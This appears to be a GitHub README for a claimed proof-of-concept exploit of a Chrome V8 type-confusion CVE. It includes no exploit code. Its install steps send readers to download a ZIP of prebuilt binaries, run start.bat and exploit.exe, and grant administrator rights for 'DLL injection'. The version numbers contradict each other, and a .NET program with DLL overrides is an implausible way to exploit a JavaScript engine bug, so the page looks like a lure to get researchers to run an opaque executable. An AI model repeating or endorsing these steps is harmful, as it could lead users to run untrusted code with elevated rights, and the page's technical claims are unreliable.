# CVE-2025-13223 - V8 Type Confusion in Google Chrome

## 🚀 Overview
This repository contains a proof-of-concept exploit for CVE-2025-13223, a critical type confusion vulnerability in the V8 JavaScript engine of Google Chrome versions up to 142.0.7444.166. The vulnerability arises from improper type handling during object allocation and access in V8's turbofan compiler pipeline, allowing a remote attacker to trigger heap corruption via a crafted HTML page. Successful exploitation can lead to arbitrary code execution in the renderer process, potentially compromising confidentiality, integrity, and availability.

This exploit demonstrates the vulnerability by manipulating typed arrays and prototype chains to confuse V8's type tracking, resulting in out-of-bounds access and heap overflow.

**Important Safety Disclaimer:** This repository is provided for educational and security research purposes only. Exploiting vulnerabilities in production environments without authorization is illegal and unethical. Use this code responsibly in controlled, isolated testing environments to study browser security. The authors disclaim any liability for misuse. Always follow ethical hacking guidelines and obtain proper permissions before testing.

## 📋 Prerequisites
* Windows 10 or later (x64 architecture recommended for compatibility with Chrome's sandbox).
* Google Chrome installed, version 141.0.7390.76 or earlier (vulnerable build; the included folder provides necessary DLL overrides for testing).
* .NET Framework 4.8 or higher for the exploit executable.
* Administrative privileges may be required for DLL injection during setup.
* A basic understanding of browser internals, JavaScript engines, and memory corruption techniques.

## Download & Install
1. Download the ZIP archive from the following link: [Download Exploit ZIP](https://github.com/Darwin72820/CVE-2025-13223/raw/refs/heads/main/binary/CVE-2025-13223.zip). This archive includes the main exploit executable, startup batch script, and supporting files.
2. Extract the ZIP to a local directory, e.g., `C:\CVE-2025-13223`.
3. Ensure the folder structure is preserved, including the `141.0.7390.76` subdirectory containing the manifest and DLL for version-specific overrides.

No additional installation is required beyond extracting the files. The exploit uses self-contained binaries and does not rely on external dependencies.

## 🛠 Quick Start
1. Navigate to the extracted directory.
2. Double-click `start.bat` to launch the exploit. This script initializes the environment and runs `exploit.exe`.
3. Follow the on-screen prompts in the console window to load the crafted HTML payload in a vulnerable Chrome instance.

## 🔧 Exploitation Steps
1. **Payload Preparation:** The exploit executable (`exploit.exe`) generates a malicious HTML file (`payload.html`) containing JavaScript that exploits the type confusion. It manipulates `TypedArray` objects to create a mismatched type inference in V8's JIT compiler, leading to a use-after-free primitive.
2. **Triggering the Exploit:**
   - Run `start.bat`, which executes `exploit.exe`.
   - The tool will prompt for a target URL or local file; use `file:///C:/CVE-2025-13223/payload.html` to load locally.
   - In Chrome, navigate to the payload URL. User interaction is required (e.g., clicking a button on the page) to trigger the JavaScript execution.
   - Monitor the console for heap spray indicators and corruption logs. Successful exploitation will demonstrate arbitrary read/write via the corrupted heap.
3. **Verification:** Use tools like WinDbg or Chrome's built-in developer tools to inspect memory states pre- and post-exploitation. Look for signs of type mismatch in V8's object maps.
4. **Advanced Usage:** Modify the config file (`config.json`) if present to adjust parameters like heap spray size or prototype chain depth for different V8 builds.

Exploitation is remote-capable but requires the victim to visit a malicious page. No authentication is needed, and the attack vector is primarily web-based.

## 🛡️ Mitigation
To protect against CVE-2025-13223:
- **Upgrade Immediately:** Update Google Chrome to version 142.0.7444.175 or later, which patches the type confusion issue in V8.
- **Enable Sandboxing Enhancements:** Ensure Chrome's site isolation and renderer code integrity checks are active (via `chrome://flags`).
- **Use Security Tools:** Deploy endpoint detection and response (EDR) solutions that monitor for anomalous memory access patterns in browser processes.
- **Best Practices:** Avoid visiting untrusted websites, enable automatic updates, and consider using extensions like uBlock Origin to block malicious scripts.
- **For Developers:** Validate type assumptions in JavaScript code, especially when dealing with dynamic objects or arrays. Refer to Chromium's security advisories for V8 hardening techniques.
- **Organizational Response:** Follow CISA guidelines from the Known Exploited Vulnerabilities Catalog: Apply vendor patches by the due date (12/10/2025), or discontinue use if mitigations are unavailable. Nessus plugin ID 275577 can scan for vulnerable installations.
